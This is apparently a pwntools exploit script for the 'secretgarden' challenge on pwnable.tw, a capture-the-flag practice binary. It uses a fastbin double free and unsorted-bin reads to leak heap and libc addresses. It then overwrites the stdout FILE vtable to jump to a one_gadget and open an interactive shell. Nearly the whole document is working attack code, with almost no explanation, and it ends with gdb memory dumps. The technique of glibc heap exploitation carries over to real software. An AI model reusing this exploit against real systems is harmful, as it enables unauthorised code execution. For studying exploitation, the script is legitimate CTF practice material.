from pwn import *
import time

def leak(string):
    for i in range (len(string)):
        print i, hex(ord(string[i])), string[i]

s = process('./secretgarden')
#s = remote('chall.pwnable.tw',10203)
########################################################
def raise_(length,name,color):
    s.sendline('1')
    s.recvuntil('Length of the name :')
    s.sendline(str(length))
    s.recvuntil('The name of flower :')
    s.sendline(name)
    s.recvuntil('The color of the flower :')
    s.sendline(color)
    s.recvuntil('Your choice :')
def visit():
    s.sendline('2')
    l = s.recvuntil('Your choice :')
    return l
def remove(idx):
    s.sendline('3')
    s.recvuntil('remove from the garden:')
    s.sendline(str(idx))
    s.recvuntil('Your choice :')
def clean():
    s.sendline('4')
    s.recvuntil('Your choice :')
def leave():    #exit(0)
    s.sendline('5')
    print s.recvuntil('See you next time.')
def exploit(length,name,color):
    log.info('EXPLOITING...')
    s.sendline('1')
    print s.recvuntil('Length of the name :')
    s.sendline(str(length))
    print s.recvuntil('The name of flower :')
    s.sendline(name)
    s.interactive()

#start
print s.recvuntil('Your choice :')
########################################################
# Heap Leak (Fastbin DUP)
raise_(100,'a'*99,'a'*22)   #0
raise_(100,'b'*99,'b'*22)   #1

remove(0)
remove(1)

raise_(100,'','b'*22)       #2
raise_(100,'a'*99,'a'*22)   #3
#leak(visit())
heap_base = u64(visit()[24:30]+'\x00'*2)-0x55fa7f17d00a+0x000055fa7f17c000  #1st visit
#########################################################
# Libc Leak (Unsorted Bin Attack)
raise_(128,'a'*127,'a'*22)  #4
raise_(128,'b'*127,'b'*22)  #5
raise_(128,'c'*127,'c'*22)  #6

remove(4)
remove(5)
raise_(128,'d'*7,'d'*22)    #7
libc_base = u64(visit()[479:485]+'\x00'*2)-0x7f272416bbf8+0x7f2723da7000  #2nd visit
_IO_2_1_stdout=libc_base-0x00007fe856170000+0x7fe856535620
one_gadget=libc_base+0xf1147
log.info('heap leak :'+hex(heap_base))
log.info('libc base :'+hex(libc_base))
log.info('fake chunk :'+hex(_IO_2_1_stdout))
#########################################################
#Stack Leak (Fastbin DUP (Double-Free))
raise_(100,'A'*99,'A'*22)   #8
raise_(100,'B'*99,'B'*22)   #9

remove(8)
remove(9)
visit() #3rd visit
remove(8)   #double free
visit() #4th visit

raise_(100,p64(_IO_2_1_stdout+157)+'\x00'*91,'C'*22)  #Overwrite Fastbin 10
visit() #5th visit
raise_(100,'D'*99,'D'*22)   #11
raise_(100,'E'*99,'E'*22)   #12
time.sleep(0.3)
#########################################################
#Exploit - Overwrite stdout V-table to one_gadget

payload  = p64(0x0)*2
payload += '\x00'*3
payload += p64(0xffffffff)
payload += p64(0x0)
payload += p64(one_gadget)
payload += p64(_IO_2_1_stdout+208-0x38) #call   QWORD PTR [rax+0x38]
#print=> one_gadget
"""
0x7f708565c6b8 <_IO_2_1_stdout_+152>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6c0 <_IO_2_1_stdout_+160>:   0x00007f708565b7a0
gdb-peda$ 
0x7f708565c6c8 <_IO_2_1_stdout_+168>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6d0 <_IO_2_1_stdout_+176>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6d8 <_IO_2_1_stdout_+184>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6e0 <_IO_2_1_stdout_+192>:   0x00000000ffffffff
gdb-peda$ 
0x7f708565c6e8 <_IO_2_1_stdout_+200>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6f0 <_IO_2_1_stdout_+208>:   0x0000000000000000
gdb-peda$ 
0x7f708565c6f8 <_IO_2_1_stdout_+216>:   0x00007f708565a6e0  <_IO_file_jumps> <-vtable
"""
visit() #6th visit
pause()
log.info('length of payload :'+str(len(payload)))
exploit(100,payload,'F'*22)  #13

s.close()